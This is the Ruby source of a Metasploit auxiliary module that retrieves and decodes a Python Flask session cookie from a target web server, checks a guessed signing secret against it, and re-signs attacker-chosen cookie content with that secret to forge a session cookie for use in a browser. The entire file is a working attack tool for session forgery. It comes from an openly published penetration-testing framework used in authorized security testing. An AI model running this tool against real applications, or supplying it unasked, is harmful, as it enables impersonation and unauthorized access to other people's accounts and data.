##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Python Flask Cookie Signer',
        'Description' => %q{
          This is a generic module which can manipulate Python Flask-based application cookies.
          The Retrieve action will connect to a web server, grab the cookie, and decode it.
          The Resign action will do the same as above, but after decoding it, it will replace
          the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This
          cookie can then be used in a browser. This is a Ruby based implementation of some
          of the features in the Python project Flask-Unsign.
        },
        'Author' => [
          'h00die', # MSF module
          'paradoxis', #  original flask-unsign tool
          'Spencer McIntyre', # MSF flask-unsign library
        ],
        'References' => [
          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Actions' => [
          ['Retrieve', { 'Description' => 'Retrieve a cookie from an HTTP(s) server' }],
          ['Resign', { 'Description' => 'Resign the specified cookie data' }]
        ],
        'DefaultAction' => 'Retrieve',
        'DisclosureDate' => '2019-01-26' # first commit by @Paradoxis to the Flask-Unsign repo
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'URI to browse', '/']),
        OptString.new('NEWCOOKIECONTENT', [ false, 'Content of a cookie to sign', ''], conditions: %w[ACTION == Resign]),
        OptString.new('SECRET', [ true, 'The key with which to sign the cookie', '']),
      ]
    )
    register_advanced_options(
      [
        OptString.new('CookieName', [ true, 'The name of the session cookie', 'session' ]),
        OptString.new('Salt', [ true, 'The salt to use for key derivation', Msf::Exploit::Remote::HTTP::FlaskUnsign::Session::DEFAULT_SALT ])
      ]
    )
  end

  def action_retrieve
    print_status("#{peer} - Retrieving Cookie")
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200

    cookie = cookie_jar.cookies.find { |c| c.name == datastore['CookieName'] }&.cookie_value
    fail_with(Failure::UnexpectedReply, "#{peer} - Response is missing the session cookie") unless cookie

    print_status("#{peer} - Initial Cookie: #{cookie}")
    cookie = cookie.split('=')[1].gsub(';', '')
    begin
      decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)
    rescue StandardError => e
      print_error("Failed to decode the cookie: #{e.class} #{e}")
      return
    end

    print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")

    # use dehex to allow \x style escape sequences for unprintable chars
    secret = Rex::Text.dehex(datastore['SECRET'])
    salt = Rex::Text.dehex(datastore['Salt'])

    if Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, secret, salt: salt)
      print_good("#{peer} - Secret key #{secret.inspect} is correct.")
    elsif datastore['SECRET'].present?
      print_warning("#{peer} - Secret key #{secret.inspect} is incorrect.")
    end
  end

  def run
    case action.name
    when 'Retrieve'
      action_retrieve
    when 'Resign'
      print_status("Attempting to sign with key: #{datastore['SECRET']}")
      secret = Rex::Text.dehex(datastore['SECRET'])
      salt = Rex::Text.dehex(datastore['Salt'])
      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], secret, salt: salt)
      print_good("#{peer} - New signed cookie: #{datastore['CookieName']}=#{encoded_cookie}")
    end
  end
end
